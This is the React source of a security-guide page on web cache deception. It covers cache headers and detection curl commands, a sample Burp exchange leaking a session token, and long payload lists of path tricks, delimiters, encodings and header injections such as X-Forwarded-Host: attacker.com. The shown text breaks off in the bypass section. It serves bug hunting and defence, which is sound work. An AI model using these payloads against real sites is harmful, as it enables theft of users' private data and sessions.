"use client"

import { useState } from "react"
import Image from "next/image"
import { ContentLayout } from "@/components/content-layout"
import { CommandCard } from "@/components/command-card"
import {
  Shield, Terminal, ChevronRight, ExternalLink, Bug,
  Search, AlertTriangle, CheckCircle, XCircle, Zap,
  FileText, BookOpen, Video, Globe,
} from "lucide-react"

const phases = [
  { id: "introduction", label: "Introduction" },
  { id: "cache-fundamentals", label: "Cache Fundamentals" },
  { id: "detection", label: "Detection & Analysis" },
  { id: "exploitation", label: "Exploitation Example" },
  { id: "endpoints", label: "Endpoints & Extensions" },
  { id: "payloads", label: "WCD Payloads" },
  { id: "advanced-bypasses", label: "Advanced Bypasses" },
  { id: "automation", label: "Automation & Checklist" },
  { id: "prevention", label: "Prevention" },
]

export default function CacheDeceptionPage() {
  const [activeCategory, setActiveCategory] = useState("introduction")
  const [expandedImg, setExpandedImg] = useState<string | null>(null)

  const scrollToSection = (id: string) => {
    setActiveCategory(id)
    const element = document.getElementById(id)
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" })
    }
  }

  return (
    <ContentLayout
      pageTitle="Web Cache Deception"
      breadcrumbItems={[
        { label: "Home", href: "/" },
        { label: "Web Vulnerabilities", href: "/vulnerabilities" },
        { label: "Web Cache Deception" },
      ]}
      hero={{
        icon: Shield,
        title: "Web Cache Deception — Advanced Bug Hunter's Guide",
        description: "Advanced Tactics, Payloads and Real-World Methods to Uncover Hidden Cache Deception Flaws. Learn how attackers trick CDNs and reverse proxies into caching sensitive data, enabling unauthorized access and account takeover.",
        stats: [
          { label: "9 Sections", className: "bg-amber-500/10 text-amber-500" },
          { label: "200+ Payloads", className: "bg-accent/10 text-accent" },
          { label: "Copy Ready", className: "bg-secondary text-foreground" },
        ],
        gradient: "from-amber-500/10 via-background to-orange-500/5",
        iconBg: "bg-amber-500/10 text-amber-500",
        image: { src: "/images/vulnerabilities/cache-deception/1_1yK2ITetgJRfkRqWpMr9tA.webp", alt: "Web Cache Deception overview" },
        decor: <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PHBhdHRlcm4gaWQ9ImdyaWQiIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHBhdGggZD0iTSA2MCAwIEwgMCAwIDAgNjAiIGZpbGw9Im5vbmUiIHN0cm9rZT0icmdiYSgyNTUsMjU1LDI1NSwwLjAzKSIgc3Ryb2tlLXdpZHRoPSIxIi8+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyaWQpIi8+PC9zdmc+')] opacity-50" />,
      }}
      phases={phases}
      activeCategory={activeCategory}
      onPhaseChange={scrollToSection}
      navActiveClass="bg-amber-500 text-white"
      expandedImg={expandedImg}
      onLightboxClose={() => setExpandedImg(null)}
      onLightboxOpen={(src) => setExpandedImg(src)}
    >

      {/* —————————— Introduction —————————— */}
      <section id="introduction" className="scroll-mt-24">
        <h2 className="mb-4 text-2xl font-bold text-foreground">Introduction</h2>
        <p className="text-muted-foreground leading-relaxed">
          Web cache deception is a high-impact vulnerability where attackers trick caching mechanisms into storing and serving sensitive content, enabling unauthorized data access or account takeover. This guide covers advanced detection and exploitation techniques to help security professionals safeguard their applications.
        </p>

        <h3 className="mt-8 mb-3 text-xl font-semibold text-foreground">In This Guide</h3>
        <ul className="space-y-2 text-muted-foreground">
          {[
            "Web Cache Deception fundamentals",
            "How WCD works and its impact",
            "Cache keys and caching behavior",
            "Cache detection and manual verification",
            "Advanced bypass techniques and special headers",
            "Encoded paths and query parameter manipulation",
            "Extensive payloads, delimiters, and URL tricks",
            "Step-by-step exploitation methodology",
            "Real-world attack examples",
            "Mass hunting and automation commands",
            "Prevention and mitigation strategies",
            "Recommended tools and practice labs",
          ].map((item) => (
            <li key={item} className="flex items-start gap-2">
              <ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" />
              <span>{item}</span>
            </li>
          ))}
        </ul>

        <h3 className="mt-8 mb-3 text-xl font-semibold text-foreground">What is Web Cache Deception?</h3>
        <p className="text-muted-foreground leading-relaxed">
          Web Cache Deception (WCD) occurs when an attacker manipulates a caching system such as a CDN, reverse proxy or browser cache into storing sensitive content under what appears to be a harmless static resource. When another user requests that resource the cache serves the sensitive data instead, exposing information that should remain private. This typically arises from improper cache configurations, missing or incorrect security headers or flaws in how URLs and query parameters are processed.
        </p>

        <h4 className="mt-6 mb-2 font-medium text-foreground">A Simplified WCD Attack Flow</h4>
        <ul className="space-y-2 text-muted-foreground list-decimal list-inside">
          <li>The website uses a CDN or reverse proxy (e.g., Cloudflare, Akamai, Fastly) that caches static files like .css, .js, .jpg</li>
          <li>Private pages exist (e.g., /account, /profile, /settings) that should never be cached</li>
          <li>Attacker appends a fake static file extension to a private endpoint</li>
        </ul>

        <div className="mt-3">
          <CommandCard command="https://target.com/account/style.css" description="Append .css to private endpoint" index={1} />
        </div>

        <ul className="space-y-1 text-muted-foreground list-decimal list-inside mt-2" start={4}>
          <li>The cache sees .css → treats it as a static resource → stores the HTML content of the private page</li>
          <li>Any unauthenticated user visiting that URL later gets the cached private content</li>
        </ul>

        <h4 className="mt-6 mb-2 font-medium text-foreground">Impact</h4>
        <ul className="space-y-2 text-muted-foreground">
          {["Exposure of personal information", "Session hijacking", "Authentication bypass", "Complete account takeover"].map((item) => (
            <li key={item} className="flex items-start gap-2">
              <ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" />
              <span>{item}</span>
            </li>
          ))}
        </ul>
      </section>

      {/* —————————— Cache Fundamentals —————————— */}
      <section id="cache-fundamentals" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <BookOpen className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 1</span>
            <h2 className="text-2xl font-bold text-foreground">Cache Fundamentals</h2>
          </div>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Types of Caches</h3>
        <div className="mb-6 overflow-hidden rounded-lg border border-border">
          <table className="w-full text-left text-sm">
            <thead>
              <tr className="border-b border-border bg-muted">
                <th className="px-4 py-3 font-semibold text-foreground">Type</th>
                <th className="px-4 py-3 font-semibold text-foreground">Description</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border">
              <tr><td className="px-4 py-3 font-medium text-foreground">Browser Caches</td><td className="px-4 py-3 text-muted-foreground">Store resources locally on a user's device</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">CDN Caches</td><td className="px-4 py-3 text-muted-foreground">Distributed caches at edge locations for faster delivery</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Reverse Proxy Caches</td><td className="px-4 py-3 text-muted-foreground">Server-side caches that reduce origin server load</td></tr>
            </tbody>
          </table>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Cache Control Headers</h3>
        <div className="mb-6 overflow-hidden rounded-lg border border-border">
          <table className="w-full text-left text-sm">
            <thead>
              <tr className="border-b border-border bg-muted">
                <th className="px-4 py-3 font-semibold text-foreground">Header</th>
                <th className="px-4 py-3 font-semibold text-foreground">Purpose</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border">
              <tr><td className="px-4 py-3 font-medium text-foreground">Cache-Control</td><td className="px-4 py-3 text-muted-foreground">Directives for caching mechanisms</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Pragma</td><td className="px-4 py-3 text-muted-foreground">HTTP/1.0 header for cache control</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Expires</td><td className="px-4 py-3 text-muted-foreground">Specifies when the response expires</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">ETag</td><td className="px-4 py-3 text-muted-foreground">Identifier for a specific version of a resource</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Last-Modified</td><td className="px-4 py-3 text-muted-foreground">Indicates when the resource was last modified</td></tr>
            </tbody>
          </table>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Cache Keys</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Caches use keys to identify and store resources. These keys are typically based on:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span>The full URL (including query parameters)</span></li>
          <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span>Selected headers (Host, User-Agent, Accept-Encoding etc.)</span></li>
          <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span>Cookies (in some configurations)</span></li>
        </ul>
      </section>

      {/* —————————— Detection & Analysis —————————— */}
      <section id="detection" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <Search className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 2</span>
            <h2 className="text-2xl font-bold text-foreground">Cache Detection & Analysis</h2>
          </div>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Using Cache Checker Tools</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Online tools like giftofspeed.com can help determine if a resource is being cached. These tools analyze HTTP responses and provide insights into caching behavior. You can enter the full URL with your cache key to test it or use the base domain to discover which resources are currently cached.
        </p>

        <div className="mt-4 grid gap-4 sm:grid-cols-2">
          <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/cache-deception/1_vcvZczhAwedktCn10SoTzw.webp")}>
            <Image src="/images/vulnerabilities/cache-deception/1_vcvZczhAwedktCn10SoTzw.webp" alt="Cache detection with GiftOfSpeed" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
          </div>
          <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/vulnerabilities/cache-deception/1__5CU9iT97AyPga8p_LFSSQ.webp")}>
            <Image src="/images/vulnerabilities/cache-deception/1__5CU9iT97AyPga8p_LFSSQ.webp" alt="Cache analysis results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
          </div>
        </div>

        <h3 className="mt-8 mb-3 text-lg font-semibold text-foreground">Key Headers to Analyze</h3>
        <div className="mb-6 overflow-hidden rounded-lg border border-border">
          <table className="w-full text-left text-sm">
            <thead>
              <tr className="border-b border-border bg-muted">
                <th className="px-4 py-3 font-semibold text-foreground">Header</th>
                <th className="px-4 py-3 font-semibold text-foreground">What to Look For</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border">
              <tr><td className="px-4 py-3 font-medium text-foreground">Cache-Control</td><td className="px-4 py-3 text-muted-foreground">no-store, no-cache (sensitive); public, max-age=86400 (cached)</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Expires</td><td className="px-4 py-3 text-muted-foreground">Future date → likely cached until then</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">ETag</td><td className="px-4 py-3 text-muted-foreground">Present → can validate/compare versions</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Last-Modified</td><td className="px-4 py-3 text-muted-foreground">Recent timestamp vs. origin changes</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Vary</td><td className="px-4 py-3 text-muted-foreground">Vary: Cookie or missing → important for auth-sensitive content</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">X-Cache</td><td className="px-4 py-3 text-muted-foreground">HIT = served from cache, MISS = not cached</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Age</td><td className="px-4 py-3 text-muted-foreground">Age &gt; 0 → response came from cache</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Pragma</td><td className="px-4 py-3 text-muted-foreground">Pragma: no-cache → indicates no-cache</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">Surrogate-Control</td><td className="px-4 py-3 text-muted-foreground">max-age=... or no-store for CDNs</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">X-Served-By</td><td className="px-4 py-3 text-muted-foreground">Identifies the server/CDN node that served the request</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">CF-Cache-Status</td><td className="px-4 py-3 text-muted-foreground">HIT, MISS, EXPIRED, BYPASS (Cloudflare)</td></tr>
              <tr><td className="px-4 py-3 font-medium text-foreground">X-Cache-Status</td><td className="px-4 py-3 text-muted-foreground">HIT / MISS / STALE / BYPASS</td></tr>
            </tbody>
          </table>
        </div>

        <p className="mb-4 text-sm text-muted-foreground">
          <strong>HIT</strong> means the content was served from the cache.<br />
          <strong>MISS</strong> means the content was fetched from the origin server.<br />
          <strong>X-Cache: dynamic</strong> indicates the response was generated dynamically.<br />
          <strong>X-Cache: refresh</strong> shows that the cached content was outdated and refreshed.
        </p>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Manual Verification Techniques</h3>
        <ul className="space-y-2 text-muted-foreground">
          <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span><strong>Request-Response Analysis:</strong> Make multiple identical requests and compare responses</span></li>
          <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span><strong>Cache Busting:</strong> Add unique parameters ?v=123 to URLs and observe if responses change</span></li>
          <li className="flex items-start gap-2"><ChevronRight className="mt-1 h-3 w-3 shrink-0 text-amber-500" /><span><strong>Timing Analysis:</strong> Cached responses typically have faster response times</span></li>
        </ul>

        <div className="mt-4 space-y-2">
          <CommandCard command="curl -I https://target.com/account.css" description="Check if URL is cached — look for X-Cache: HIT, Age > 0" index={2} />
          <CommandCard command="curl -I -H 'Cache-Control: no-cache' https://target.com/account.css" description="Send request with cache bypass header" index={3} />
          <CommandCard command="curl -I https://target.com/account.css ; curl -I https://target.com/account.css?v=$(date +%s)" description="Cache busting — add unique query parameters" index={4} />
          <CommandCard command="time curl -s -o /dev/null -w '%{time_total}' https://target.com/account.css" description="Timing analysis — cached responses are faster" index={5} />
          <CommandCard command="curl -s -D - https://target.com/account.css -o /dev/null | grep -iE 'x-cache|cf-cache|age:|cache-control|expires|etag'" description="Extract all cache-related headers" index={6} />
        </div>
      </section>

      {/* —————————— Exploitation Example —————————— */}
      <section id="exploitation" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <Zap className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 3</span>
            <h2 className="text-2xl font-bold text-foreground">WCD Exploitation Example</h2>
          </div>
        </div>

        <p className="mb-4 text-muted-foreground leading-relaxed">
          The server processes /account.php as a PHP script, but due to the added /poc.css suffix the CDN caches the HTML/PHP-generated sensitive content as if it were a static CSS file. Anyone visiting the URL later gets the cached sensitive data without authentication.
        </p>

        <h4 className="mb-2 font-medium text-foreground">Burp Request</h4>
        <div className="mb-4 rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Burp Request</div>
          <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`GET /account.php/poc.css HTTP/1.1
Host: vulnerable-example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0)
Accept: text/css,*/*;q=0.1
Cache-Control: no-cache`}</code></pre>
        </div>

        <h4 className="mb-2 font-medium text-foreground">Burp Response</h4>
        <div className="mb-4 rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Burp Response</div>
          <pre className="overflow-x-auto p-4 text-sm text-foreground"><code>{`HTTP/1.1 200 OK
Date: Mon, 11 Aug 2025 09:40:18 GMT
Content-Type: text/css
Content-Length: 412
Cache-Control: public, max-age=86400
X-Cache: HIT

/* Cached response exposing sensitive data */
body { background-color: #fff; }

/* Attacker view */
username: johndoe@example.com
email: johndoe@example.com
session_token: 9f73b21d2e934f6e4cbdc8d83c4e9210`}</code></pre>
        </div>

        <p className="text-muted-foreground leading-relaxed">
          The server processes /account.php as a PHP script, but due to the added /poc.css suffix the CDN caches the HTML/PHP-generated sensitive content as if it were a static CSS file. Anyone visiting the URL later gets the cached sensitive data without authentication.
        </p>
      </section>

      {/* —————————— Endpoints & Extensions —————————— */}
      <section id="endpoints" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <Globe className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 4</span>
            <h2 className="text-2xl font-bold text-foreground">Endpoints & File Extensions</h2>
          </div>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Identifying Cacheable Endpoints</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          When looking for web cache deception bugs, some endpoints are more likely to be vulnerable. Start by checking these common sensitive paths first:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Sensitive Paths</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>/account</span><span>/profile</span><span>/dashboard</span><span>/settings</span><span>/user</span><span>/admin</span><span>/private</span><span>/my-account</span><span>/user/profile</span><span>/dashboard/image</span><span>/dashboard/profile</span><span>/account/user</span><span>/address</span><span>/account/settings</span><span>/profile/edit</span><span>/user/settings</span><span>/admin/panel</span><span>/private/files</span><span>/my-account/orders</span><span>/user/details</span><span>/dashboard/reports</span><span>/account/profile</span><span>/account/info</span><span>/profile/view</span><span>/admin/settings</span><span>/private/data</span><span>/my-account/settings</span><span>/user/account</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">File Extensions to Test</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          When testing for cache deception, append various file extensions to sensitive endpoints to make them appear as static resources:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Extensions</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>.css</span><span>.js</span><span>.svg</span><span>.asp</span><span>.aspx</span><span>.atom</span><span>.bak</span><span>.bin</span><span>.cgi</span><span>.csv</span><span>.do</span><span>.eot</span><span>.exe</span><span>.fake.js</span><span>.gif</span><span>.html</span><span>.ico</span><span>.jpg</span><span>.jpeg</span><span>.json</span><span>.jsp</span><span>.mp3</span><span>.mp4</span><span>.old</span><span>.pdf</span><span>.php</span><span>.png</span><span>.rss</span><span>.tar.gz</span><span>.tmp</span><span>.ttf</span><span>.txt</span><span>.webm</span><span>.woff</span><span>.woff2</span><span>.xml</span><span>.zip</span><span>.7z</span>
          </div>
        </div>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Extension Appends</div>
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5">/dashboard.png</span><span className="py-0.5">/user.js</span><span className="py-0.5">/admin.css</span><span className="py-0.5">/orders.jpg</span>
          </div>
        </div>

        <div className="mt-4 rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Fake Directories</div>
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5">/admin.css/login</span><span className="py-0.5">/account.js/test</span><span className="py-0.5">/settings/fake.js</span><span className="py-0.5">/orders/test/style.css</span>
          </div>
        </div>
      </section>

      {/* —————————— WCD Payloads —————————— */}
      <section id="payloads" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <Terminal className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 5</span>
            <h2 className="text-2xl font-bold text-foreground">WCD Payload Techniques</h2>
          </div>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Path Poison</h3>
        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account.css</span><span className="py-0.5 break-all">https://target.com/profile.html</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Obfuscated Path</h3>
        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account%2fstyle.css</span><span className="py-0.5 break-all">https://target.com/profile%3ftest=1.js</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Using Delimiters</h3>
        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account;random.js</span><span className="py-0.5 break-all">https://target.com/profile@anything.css</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Force Cache with Special Headers</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          These headers can deceive caching systems into handling a dynamic response as if it were tied to a different cacheable URL:
        </p>
        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">X-Original-URL: /admin/</span><span className="py-0.5 break-all">X-Rewrite-URL: /profile/</span><span className="py-0.5 break-all">X-Forwarded-Host: attacker.com</span><span className="py-0.5 break-all">X-Forwarded-Path: /static.css</span><span className="py-0.5 break-all">curl -H 'X-Original-URL: /admin/' https://target.com/dashboard/style.css</span><span className="py-0.5 break-all">curl -H 'X-Forwarded-Path: /static.css' https://target.com/account</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Bypassing with Encoded Paths</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          URL encoding can confuse backend vs frontend behavior, potentially creating cacheable paths that access sensitive data:
        </p>
        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/settings/%2e%2e/images/logo.png</span><span className="py-0.5 break-all">https://target.com/admin/%2e%2e/scripts/app.js</span><span className="py-0.5 break-all">https://target.com/profile/%2e%2e/assets/styles.css</span><span className="py-0.5 break-all">https://target.com/billing/%2e%2e/fonts/main.woff</span><span className="py-0.5 break-all">https://target.com/api/v2/orders/%2e%2e/public/data.json</span><span className="py-0.5 break-all">https://target.com/user/%2e%2e/favicon.ico</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Injecting Cache Keys with Query Parameters</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Many CDNs cache based on certain query parameters. Attackers can exploit this by crafting URLs:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Cache Key Payloads</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>.js?test=123</span><span>.css?test=123</span><span>.jpeg?test=123</span><span>.jpg?test=123</span><span>.png?test=123</span><span>.gif?test=123</span><span>.woff?test=123</span><span>.woff2?test=123</span><span>.ttf?test=123</span><span>.otf?test=123</span><span>.svg?test=123</span><span>.html?test=123</span><span>.xml?test=123</span><span>.json?test=123</span><span>.mp4?test=123</span><span>.webm?test=123</span><span>.ico?test=123</span><span>.txt?test=123</span><span>.pdf?test=123</span><span>.doc?test=123</span><span>.xls?test=123</span><span>.ppt?test=123</span><span>.mp3?test=123</span><span>.ogg?test=123</span><span>.wav?test=123</span><span>.csv?test=123</span><span>.swf?test=123</span><span>.zip?test=123</span><span>.tar?test=123</span><span>.gz?test=123</span><span>.bz2?test=123</span><span>.7z?test=123</span><span>.webp?test=123</span><span>.bmp?test=123</span><span>.mpg?test=123</span><span>.avi?test=123</span><span>.mkv?test=123</span><span>.flv?test=123</span><span>.wmv?test=123</span><span>.weba?test=123</span><span>.srt?test=123</span><span>.vtt?test=123</span><span>.rss?test=123</span><span>.atom?test=123</span><span>.yaml?test=123</span><span>.log?test=123</span><span>.jar?test=123</span><span>.plist?test=123</span><span>.jsp?test=123</span><span>.aspx?test=123</span><span>.shtml?test=123</span><span>.map?test=123</span>
          </div>
        </div>

        <div className="mt-4 rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account?file=main.js</span><span className="py-0.5 break-all">https://target.com/settings?theme=dark.css</span><span className="py-0.5 break-all">https://target.com/user?resource=profile.jpg</span><span className="py-0.5 break-all">https://target.com/admin?view=dashboard.png</span><span className="py-0.5 break-all">https://target.com/api?callback=static.js</span><span className="py-0.5 break-all">https://target.com/profile.js?test=123</span><span className="py-0.5 break-all">https://target.com/account.css?test=123</span><span className="py-0.5 break-all">https://target.com/settings.jpeg?test=123</span><span className="py-0.5 break-all">https://target.com/dashboard.jpg?test=123</span>
          </div>
        </div>
      </section>

      {/* —————————— Advanced Bypasses —————————— */}
      <section id="advanced-bypasses" className="scroll-mt-24">
        <div className="mb-6 flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-amber-500/10 text-amber-500">
            <AlertTriangle className="h-5 w-5" />
          </div>
          <div>
            <span className="text-xs font-medium text-amber-500">Phase 6</span>
            <h2 className="text-2xl font-bold text-foreground">Advanced Bypass Techniques</h2>
          </div>
        </div>

        <h3 className="mb-3 text-lg font-semibold text-foreground">Delimiters and Special Characters</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Use these delimiters and special characters to creatively manipulate URLs and bypass cache rules:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Delimiters</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>~</span><span>\/</span><span>\</span><span>;</span><span>:</span><span>//</span><span>/</span><span>..</span><span>.</span><span>_</span><span>-</span><span>@</span><span>?</span><span>=</span><span>#</span><span>##</span><span>!*</span><span>!</span><span>&amp;</span><span>$</span>
          </div>
        </div>

        <div className="mt-4 rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">Encoded Delimiters</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>%5c</span><span>%3d</span><span>%2f</span><span>%2e</span><span>%26</span><span>%23</span><span>%20</span><span>%0a</span><span>%09</span><span>%00</span>
          </div>
        </div>

        <div className="rounded-lg border border-border bg-card">
          <div className="flex flex-col p-4 font-mono text-sm text-foreground">
            <span className="py-0.5 break-all">https://target.com/account~style.css</span><span className="py-0.5 break-all">https://target.com/profile\/test.js</span><span className="py-0.5 break-all">https://target.com/settings\backup.jpg</span><span className="py-0.5 break-all">https://target.com/dashboard;v2.png</span><span className="py-0.5 break-all">https://target.com/user:data.css</span><span className="py-0.5 break-all">https://target.com/admin//panel.js</span><span className="py-0.5 break-all">https://target.com/private/../secret.css</span><span className="py-0.5 break-all">https://target.com/profile.edit.jpg</span><span className="py-0.5 break-all">https://target.com/user_name-test.gif</span><span className="py-0.5 break-all">https://target.com/account@cache.png</span><span className="py-0.5 break-all">https://target.com/profile?version=1.css</span><span className="py-0.5 break-all">https://target.com/settings=value.js</span><span className="py-0.5 break-all">https://target.com/dashboard#section.css</span><span className="py-0.5 break-all">https://target.com/user##details.js</span><span className="py-0.5 break-all">https://target.com/admin!*test.jpg</span><span className="py-0.5 break-all">https://target.com/private!cache.gif</span><span className="py-0.5 break-all">https://target.com/profile&token=123.css</span><span className="py-0.5 break-all">https://target.com/account$hidden.js</span><span className="py-0.5 break-all">https://target.com/settings%5cencoded.jpg</span><span className="py-0.5 break-all">https://target.com/dashboard%3dversion.css</span><span className="py-0.5 break-all">https://target.com/user%2ffile.js</span><span className="py-0.5 break-all">https://target.com/admin%2eedit.png</span><span className="py-0.5 break-all">https://target.com/private%26data.css</span><span className="py-0.5 break-all">https://target.com/profile%23hash.js</span><span className="py-0.5 break-all">https://target.com/account%20space.jpg</span><span className="py-0.5 break-all">https://target.com/settings%0anewline.css</span><span className="py-0.5 break-all">https://target.com/dashboard%09tab.js</span><span className="py-0.5 break-all">https://target.com/user%00nullbyte.png</span>
          </div>
        </div>

        <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Special Delimiter Testing</h3>
        <p className="mb-4 text-muted-foreground leading-relaxed">
          Try inserting these special delimiters right before file extensions to see if caching systems mishandle the URLs:
        </p>

        <div className="rounded-lg border border-border bg-card">
          <div className="border-b border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">;.ext?test=123</div>
          <div className="flex flex-col p-4 text-sm font-mono text-foreground">
            <span>;.js?test=123</span><span>;.css?test=123</span><span>;.jpeg?test=123</span><span>;.jpg?test=123</span><span>;.png?test=123</span><span>;.gif?test=123</span><span>;.woff?test=123</span><span>;.woff2?test=123</span><span>;.ttf?test=123</span><span>;.otf?test=123</span><span>;.svg?test=123</span><span>;.html?test=123</span><span>;.xml?test=123</span><span>;.json?test=123</span><span>;.mp4?test=123</span><span>;.ico?test=123</span><span>;.txt?test=123</span><span>;.pdf?test=123</span><span>;.zip?test=123</span><span>;.csv?test=123</span>
          </div>
        </div>

